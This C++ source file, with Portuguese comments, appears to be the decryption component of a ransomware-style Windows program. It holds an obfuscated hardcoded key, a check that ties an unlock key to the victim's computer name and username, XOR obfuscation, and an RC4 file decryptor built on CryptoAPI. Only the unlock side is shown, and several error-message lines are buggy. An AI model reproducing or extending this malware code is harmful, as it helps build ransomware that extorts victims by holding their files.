#pragma warning (disable : 4996) // Desativa o aviso 4996 do compilador
#pragma comment (lib, "advapi32") // Link com a livraria com pragma

// Inclusões de livrarias
#include "config.h"
#include "Crypt.h"
#include "GeneralOperations.h"

#define KEYLENGTH  0x00800000
#define ENCRYPT_ALGORITHM CALG_RC4
#define ENCRYPT_BLOCK_SIZE 8

#define A(c) (c) - 0x19
#define PASSWORD { A('S'), A('T'), A('U'), A('F'), A('F'), A('Y'), A('1'), A('3'), A('3'), A('7'), 0 }

std::string Crypt::Base64Decode(const std::string& in) {
	std::string out;

	std::vector<int> T(256, -1);
	for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

	int val = 0, valb = -8;
	for (unsigned char c : in) {
		if (T[c] == -1) break;
		val = (val << 6) + T[c];
		valb += 6;
		if (valb >= 0) {
			out.push_back(char((val >> valb) & 0xFF));
			valb -= 8;
		}
	}

	return out;
}

bool Crypt::ValidatePassword(std::string const& key) {
	std::string data = Base64Decode(key);
	std::string computerInfo = GeneralOperations::ComputerName() + GeneralOperations::Username();
	return data.compare(0, computerInfo.size(), computerInfo) == 0;
}

string Crypt::XOR(string data) {
	char key[] = PASSWORD;

	string xorstring = data;
	for (int i = 0; i < xorstring.size(); i++) {
		xorstring[i] = data[i] ^ key[i % (sizeof(key) / sizeof(char))];
	}
	return xorstring;
}

bool Crypt::UnlockFile(LPTSTR pszSourceFile, LPTSTR pszDestinationFile, LPTSTR pszPassword) {
	bool fReturn = false;

	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestinationFile = INVALID_HANDLE_VALUE;

	HCRYPTPROV hCryptProv = NULL;
	HCRYPTKEY hKey = NULL;
	HCRYPTHASH hHash = NULL;

	DWORD dwCount;
	PBYTE pbBuffer = NULL;
	DWORD dwBlockLen;
	DWORD dwBufferLen;


	hSourceFile = CreateFile(pszSourceFile, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE != hSourceFile) {
		std::cout << "The source encrypted file is open." << endl;
	}
	else {
		std::cout << "Error opening source plaintext file! " + GetLastError() << endl;
	}

	hDestinationFile = CreateFile(pszDestinationFile, FILE_WRITE_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE != hDestinationFile) {
		std::cout << "The destination file is open." << endl;
	}
	else {
		std::cout << "Error opening destination file! " + GetLastError() << endl;
	}

	if (CryptAcquireContext(&hCryptProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, 0)) {
		std::cout << "A cryptographic provider has been acquired." << endl;
	}
	else {
		std::cout << "Error during CryptAcquireContext! " + GetLastError() << endl;
	}

	if (!CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash)) {
		std::cout << "Error during CryptCreateHash! " + GetLastError() << endl;
	}

	if (!CryptHashData(hHash, (BYTE*)pszPassword, lstrlen(pszPassword), 0)) {
		std::cout << "Error during CryptHashData! " + GetLastError() << endl;
	}

	if (!CryptDeriveKey(hCryptProv, ENCRYPT_ALGORITHM, hHash, KEYLENGTH, &hKey)) {
		std::cout << "Error during CryptDeriveKey! " + GetLastError() << endl;
	}

	dwBlockLen = 1000000000 - 1000000000 % ENCRYPT_BLOCK_SIZE;
	dwBufferLen = dwBlockLen;

	if (!(pbBuffer = (PBYTE)malloc(dwBufferLen))) {
		std::cout << "Out of memory! " + E_OUTOFMEMORY << endl;
	}

	bool fEOF = false;
	do {
		if (!ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL)) {
			std::cout << "Error reading from source file! " + GetLastError() << endl;
		}

		if (dwCount <= dwBlockLen) {
			fEOF = TRUE;
		}
			
		if (!CryptDecrypt(hKey, 0, fEOF, 0, pbBuffer, &dwCount)) {
			std::cout << "Error during CryptDecrypt! " + GetLastError() << endl;
		}
		if (!WriteFile(hDestinationFile, pbBuffer, dwCount, &dwCount, NULL)) {
			std::cout << "Error writing ciphertext! " + GetLastError() << endl;
		}
	} while (!fEOF);

	fReturn = true;

	if (pbBuffer) {
		free(pbBuffer);
	}
	if (hSourceFile) {
		CloseHandle(hSourceFile);
	}
	if (hDestinationFile) {
		CloseHandle(hDestinationFile);
	}
	if (hHash) {
		if (!(CryptDestroyHash(hHash))) {
			std::cout << "Error during CryptDestroyHash." << GetLastError() << endl;
		}
		hHash = NULL;
	}
	if (hKey) {
		if (!(CryptDestroyKey(hKey))) {
			std::cout << "Error during CryptDestroyKey!" << GetLastError() << endl;

		}
	}
	if (hCryptProv) {
		if (!(CryptReleaseContext(hCryptProv, 0))) {
			std::cout << "Error during CryptReleaseContext!" << GetLastError() << endl;
		}
	}
	return fReturn;
}